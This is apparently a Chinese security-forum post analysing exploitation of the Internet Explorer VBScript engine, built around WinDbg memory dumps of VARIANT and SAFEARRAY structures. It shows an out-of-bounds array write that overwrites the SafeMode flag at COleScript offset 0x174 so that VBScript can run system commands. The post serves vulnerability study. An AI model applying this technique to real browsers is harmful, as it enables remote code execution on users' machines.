
```
0:005> dd 0x007b5e38+8
007b5e40 00000008 00000008 02b5cdc4 00000000//aa(a1)
007b5e50 00000000 00000000 00000005 00000000
007b5e60 0000200c 0000200c 0079dc0c 02f1caf0
007b5e70 00000000 00000000 00000000 00000000
007b5e80 00000000 00000000 00000000 00000000
007b5e90 00000000 00000000 00000000 00000000
007b5ea0 00000000 00000000 00000000 00000000
007b5eb0 00000000 00000000 00000000 00000000
0:005> dd 02b5cdc0
02b5cdc0 003cecc8 02b59c20 02b5c57c 00000000
02b5cdd0 003cecc8 003cff60 5c514861 08034bc8
02b5cde0 73224934 00000001 003cecc8 02b59c20
02b5cdf0 02b5c5b0 00000000 003cecc8 003cff60
02b5ce00 5c514861 08034bc8 73224934 00000002
02b5ce10 003cecc8 02b59c20 02b5c6a4 00000000
02b5ce20 003cecc8 003cff60 5c514861 08034bc8
02b5ce30 73224934 00000001 003cecc8 02b59c20
0:005> ln poi(02b5cdb8)
(73224934) vbscript!CScriptEntryPoint::`vftable' | (7323ab54) vbscript!CEntryPointDispatch::`vftable'
Exact matches:
vbscript!CScriptEntryPoint::`vftable' = <no type information>
7323c206 8bff mov edi,edi
0:005> dd 0x007b5e38
007b5e38 00000005 00000000 00000008 00000008
007b5e48 003cecdc 00000000 00000000 00000000
0:005> dd 003cecd8
003cecd8 003ce770 003ced98 003ce948 003cee00
003cece8 02b59c20 02b59c20 5e514863 08004bcb
003cecf8 00000008 00000000 003ced98 00000008
0:005> ln poi(003ce770)
(73224868) vbscript!COleScript::`vftable' | (7323fdbc) vbscript!`string'
Exact matches:
vbscript!COleScript::`vftable' = <no type information>
0:005> dd 003ce770+0x174
003ce8e4 0000000e 00000000 00000000 00000000//sagemode 标志
003ce8f4 00000000 00000000 0079a360 00000000
003ce904 00000000 00000000 00000000 00000000
003ce914 00000000 00000000 00000000 003c00c4
```

修改`SafeMode`，开启上帝模式.

```
aa(a1+2)(i+&h11c+k)=ab(4)
0:005> dd 003ce770+0x134
003ce8a4 00000000 00000000 00000000 00000000
003ce8b4 00000000 00000000 00000000 00000000
003ce8c4 00000000 00000000 003cff60 00000000
003ce8d4 003cedc8 00000000 0000000a 00000000
003ce8e4 0000000e 00000000 00000000 00000000
```

![](upload/attach/201901/771815_G29WV545Y4DT59D.png)

针对IE VbScript 引擎的漏洞分析，后续会补充CVE-2018-8174和CVE-2018-8373的分析。第一次发帖，如有错误，请指正。

### 基础知识

#### VBScript 变量内存分布

VBScript 变量在内存中占用`0x10`个字节，其定义是`VARIANT`结构体，结构如下

| 0~1 | 2~8 | 9~0xc | 0xd~0x10 |

| --- | --- | --- | --- |

| TYPE | 保留 | Data High | Data Low |

其中前两个字节用来标识变量类型，结构为`VARTYPE`。

| Constant | Value | Description |

| --- | --- | --- |

| vbEmpty | 0 | 未初始化（Empty） |

| vbNull | 1 | 无效数据（NULL） |

| vbInterger | 2 | 整型（Interger） |

| vbLong | 3 | 长整型（Long Interger） |

| vbDouble | 5 | 双精度类型 |

| vbString | 8 | 字符串类型 |

| VbClass | 9 | 类 |

| vbVariant | 12 | Variant（仅对数组有效） |

| vbArray | 8192 | (0x2000) 数组类型 |

定义如下的类型，我们在内存中进行查看；

```
<SCRIPT LANGUAGE="VBScript">

dim i, mystring

i = &h12345678

mystring = "hello world"

IsEmpty(i) #IsEmpty函数返回一个布尔值，指示是否已初始化指定的变量。如果变量未初始化，则返回true; 否则，返回False。

IsEmpty(mystring)

</script>
```

```
0:014> sxe ld:vbscript

0:005> bp vbscript!VbsIsEmpty

0:005> bl

 0 e x86 00000000`72dac206     0001 (0001)  0:**** vbscript!VbsIsEmpty

0:005> g

Breakpoint 0 hit

vbscript!VbsIsEmpty:

72dac206 8bff            mov     edi,edi

0:005:x86> dd poi(esp+c)

[0-2] type = 3 [3-8] Reserved [9-c] data High [d-0x10] data low

0059e940  00000003 00000000 12345678 00000000

0059e950  0000400c 00000000 0059d150 00000000

0059e960  0000400c 00000000 0059d11c 00000000

0:005:x86> dd 02de0f78

[0-2] type = 8 [3-8] Reserved [9-c] data High [d-0x10] data low

02de0f78  00000008 00000000 00418a6c 00000000

02de0f88  00000000 00000000 64fcdad3 0003479a

02de0f98  02ddefe8 0053cdf0 00000000 00000000

02de0fa8  00000000 00000000 00000000 00000000

02de0fb8  00000000 00000000 00000000 00000000

02de0fc8  00000000 00000000 00000000 00000000

02de0fd8  00000000 00000000 00000000 00000000

02de0fe8  00000000 00000000 00000000 00000000

0:005:x86> du 00418a6c

00418a6c  "hello world"
```

上面调试输出日志可以看出变量在`Vbscript` 中存储的内存布局。

#### 数组内存分布

在`Vbscript`引擎中，数组的结构定义为`SAFEARRAY` 和 `SAFEARRAYBOUND`

```
typedef struct tagSAFEARRAY

{

    USHORT cDims; //数组的维度

    USHORT fFeatures;//用来描述数组如何分配和释放的标志

    ULONG cbElements; //数组元素的大小

    ULONG cLocks;//计数器，用来记录该数组被锁定的次数

    PVOID pvData; //数据的缓冲区指针

    SAFEARRAYBOUND rgsabound[1];//描述数组每维的数组结构，该数组的大小是可变的

} SAFEARRAY, *LPSAFEARRAY;

typedef struct tagSAFEARRAYBOUND

 {

    ULONG cElements; //元素个数

    LONG lLbound; //索引的起始值

} SAFEARRAYBOUND, *LPSAFEARRAYBOUND;
```

我们使用如下的代码来查看数据在`VBScript`中的内存分布情况

```
<SCRIPT LANGUAGE="VBScript">

dim aa()

dim ab()

redim aa(5)

redim ab(5)#重新分配存储空间

redim Preserve aa(6)#修饰符 Preserve 当仅更改最后一个维度的大小时，用来保留现有数组中的数据

redim ab(6)

aa(0) = &h12345678

aa(1) = &habcdef12

ab(0) = "hellow ab0"

ab(1) = "hellow ab1"

IsEmpty(aa)

IsEmpty(ab)

</script>
```

windbg调试数据如下

```
0:013> sxe ld:vbscript

0:013> g

ModLoad: 00000000`715d0000 00000000`7163b000   C:\Windows\SysWOW64\vbscript.dll

ntdll!ZwMapViewOfSection+0xa:

00000000`76d9159a c3              ret

0:005> bp vbscript!VbsIsEmpty

breakpoint 1 redefined

0:005> g

Breakpoint 0 hit

vbscript!VbsIsEmpty:

715ec206 8bff            mov     edi,edi

0:005:x86> dd poi(esp+c)

029bf6b0  0000600c 00000000 002aeec8 00795c38

029bf6c0  0000400c 00000000 002aeef4 00000000

029bf6d0  0000400c 00000000 002aeebc 00000000

029bf6e0  00000000 00000000 00000000 00000000

029bf6f0  00000000 00000000 00000000 00000000

029bf700  00000000 00000000 00000000 00000000

029bf710  e4fdde55 000211c5 002a00c4 029c1cc0

029bf720  00000000 00000000 00000000 00000000

address 002aeec8 = aa = SAFEARRAY

0:005:x86> dd poi(002aeec8)

00795c38  08800001 00000010 00000000 00722c58

00795c48  00000007 00000000 4cfe9617 88000000

00795c58  722ccaf0 00000001 71f47be0 007502d8

00795c68  71f2f9f8 007680a0 71f81510 00000001

00795c78  00000006 00000000 4cfe960d 88000000

00795c88  722ccaf0 00000001 71f47be0 0075a348

00795c98  71f496f8 0075a348 71f42028 00000001

00795ca8  00000006 00000000 4cfe960b 80000000

0:005:x86> dt ole32!tagSAFEARRAY 00795c38

   +0x000 cDims            : 1

   +0x002 fFeatures        : 0x880

   +0x004 cbElements       : 0x10

   +0x008 cLocks           : 0

   +0x00c pvData           : 0x00722c58 Void

   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND

0:005:x86> dd 0x00722c58

   00722c58  00000003 00000000 12345678 00000000  //元素一

   00722c68  00000003 00000000 abcdef12 00000000  //元素二

   00722c78  00000000 00000000 00000000 00000000

   00722c88  00000000 00000000 00000000 00000000
```

经过第二次断点断下，我们来看下两个数组的内存分布,通过下面的数据可以看出，数组越界可以影响其他数据。

```
0:005:x86> dd 0x00722c58 l 50

00722c58  00000003 00000000 12345678 00000000 //aa[0]

00722c68  00000003 00000000 abcdef12 00000000 //aa[1]

00722c78  00000000 00000000 00000000 00000000 //aa[2]

00722c88  00000000 00000000 00000000 00000000 //aa[3]

00722c98  00000000 00000000 00000000 00000000 //aa[4]

00722ca8  00000000 00000000 00000000 00000000 //aa[5]

00722cb8  00000000 00000000 00000000 00000000 //aa[6]

00722cc8  4cfacd84 88000000

00722cd0  00000008 00000000 0077308c 0301d1c4 //ab[0]

00722ce0  00000008 00000000 0075ca7c 0301d1c4 //ab[1]

00722cf0  00000000 00000000 00000000 00000000 //ab[2]

00722d00  00000000 00000000 00000000 00000000 //ab[3]

00722d10  00000000 00000000 00000000 00000000 //ab[4]

00722d20  00000000 00000000 00000000 00000000 //ab[5]

00722d30  00000000 00000000 00000000 00000000 //ab[6]

00722d40  4cfacdb5 88000000 0000005a 00690066
```

#### 修改SafeMode

`VBScript` 在`IE`中的权限是受限的，可以通过修改`SafeMode`标识符来控制，具体在`COleCscript`对象的偏移`0x174`地址处。正常的情况下，该值为`0x0e`，既运行在`SafeMode`下，但是如果通过漏洞利用可以将该值修改为`0x00`，`VBScript`便可以执行我们想要执行的系统命令。`DVE`技术的精髓：通过修改关键数据结构来获取任意数据操纵的能力。

我们先通过如下的代码来验证`SafeMode`

```
<SCRIPT LANGUAGE="VBScript">

On Error Resume Next

sub testaa()

end sub

dim i,j

i=testaa

i=null

IsEmpty(i)

</script>
```

windbg调试数据如下
